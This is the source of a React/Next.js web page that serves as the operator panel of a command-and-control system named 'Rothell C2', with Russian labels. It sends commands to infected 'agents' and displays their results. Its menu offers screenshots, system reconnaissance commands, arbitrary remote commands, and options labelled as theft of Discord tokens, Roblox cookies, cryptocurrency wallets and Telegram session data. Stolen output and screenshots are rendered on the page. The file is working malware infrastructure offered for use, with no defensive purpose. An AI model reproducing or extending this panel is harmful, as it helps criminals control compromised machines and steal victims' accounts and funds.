import { useState, useEffect, useRef } from 'react';
import Head from 'next/head';

export default function Panel() {
    const [uid, setUid] = useState('');
    const [command, setCommand] = useState('screenshot');
    const [customCmd, setCustomCmd] = useState('');
    const [results, setResults] = useState([]);
    const [loading, setLoading] = useState(false);
    const [message, setMessage] = useState('');
    const observerRef = useRef(null);

    // Загрузка результатов
    useEffect(() => {
        if (!uid) return;
        fetch(`/api/results?uid=${encodeURIComponent(uid)}`)
            .then(r => r.json())
            .then(data => setResults(data || []))
            .catch(console.error);
    }, [uid, message]);

    // Motion-blur observer
    useEffect(() => {
        observerRef.current = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    entry.target.classList.add('visible');
                }
            });
        }, { threshold: 0.2 });
        document.querySelectorAll('.blur-in').forEach(el => observerRef.current.observe(el));
        return () => observerRef.current?.disconnect();
    }, []);

    const sendCommand = async () => {
        if (!uid) return alert('Введите UID агента');
        const cmd = command === 'custom' ? customCmd : command;
        setLoading(true);
        const res = await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ uid, command: cmd }),
        });
        const data = await res.json();
        if (data.success) {
            setMessage(`Команда отправлена (ID: ${data.command_id}). Ожидайте результат.`);
            setTimeout(() => setMessage(''), 2000);
        }
        setLoading(false);
    };

    return (
        <>
            <Head>
                <title>Rothell C2 Panel</title>
                <svg style={{ display: 'none' }}>
                    <filter id="noiseFilter">
                        <feTurbulence type="fractalNoise" baseFrequency="0.65" numOctaves="3" stitchTiles="stitch" />
                        <feColorMatrix type="matrix" values="1 0 0 0 0, 0 1 0 0 0, 0 0 1 0 0, 0 0 0 0.05 0" />
                    </filter>
                </svg>
            </Head>

            <div className="panel-container">
                <h1 className="panel-title blur-in">Rothell C2</h1>

                <div className="control-card glass blur-in">
                    <div className="control-group">
                        <label className="control-label">UID агента</label>
                        <input
                            type="text"
                            value={uid}
                            onChange={e => setUid(e.target.value)}
                            placeholder="hostname_IP"
                            className="control-input"
                        />
                    </div>

                    <div className="control-group">
                        <label className="control-label">Команда</label>
                        <select
                            value={command}
                            onChange={e => setCommand(e.target.value)}
                            className="control-select"
                        >
                            <option value="screenshot">Скриншот</option>
                            <option value="cmd:whoami">whoami</option>
                            <option value="cmd:dir">dir (C:\Users)</option>
                            <option value="cmd:systeminfo">systeminfo</option>
                            <option value="grab_discord">Кража Discord токенов</option>
                            <option value="grab_roblox">Кража Roblox cookie</option>
                            <option value="grab_crypto">Кража криптокошельков</option>
                            <option value="grab_tdata">Кража Telegram tdata</option>
                            <option value="grab_all">Кража ВСЕГО (Discord, Roblox, Crypto, tdata)</option>
                            <option value="custom">Своя команда</option>
                        </select>
                    </div>

                    {command === 'custom' && (
                        <div className="control-group">
                            <label className="control-label">Введите команду (например, cmd:net user)</label>
                            <input
                                type="text"
                                value={customCmd}
                                onChange={e => setCustomCmd(e.target.value)}
                                placeholder="cmd:net user"
                                className="control-input"
                            />
                        </div>
                    )}

                    <button
                        onClick={sendCommand}
                        disabled={loading}
                        className="cta-btn"
                    >
                        {loading ? 'Отправка...' : 'Отправить команду'}
                    </button>
                    {message && <p style={{ color: '#0f0', marginTop: '1rem' }}>{message}</p>}
                </div>

                <div className="separator"></div>

                <div className="results-container blur-in">
                    <h2 style={{ fontSize: '1.5rem', marginBottom: '1rem' }}>
                        Результаты для {uid || '...'}
                    </h2>
                    {results.length === 0 && (
                        <p style={{ color: '#aaa' }}>Нет результатов. Отправьте команду агенту.</p>
                    )}
                    {results.map((res, idx) => (
                        <div key={idx} className="result-card">
                            <div className="result-header">
                                <span>ID: {res.command_id}</span>
                                <span>{new Date(res.time).toLocaleString()}</span>
                            </div>
                            <pre className="result-output">{res.output}</pre>
                            {res.screenshot && (
                                <div>
                                    <strong style={{ color: '#aaa' }}>Скриншот:</strong>
                                    <br />
                                    <img
                                        src={`data:image/png;base64,${res.screenshot}`}
                                        className="result-screenshot"
                                        alt="screenshot"
                                    />
                                </div>
                            )}
                        </div>
                    ))}
                </div>
            </div>
        </>
    );
}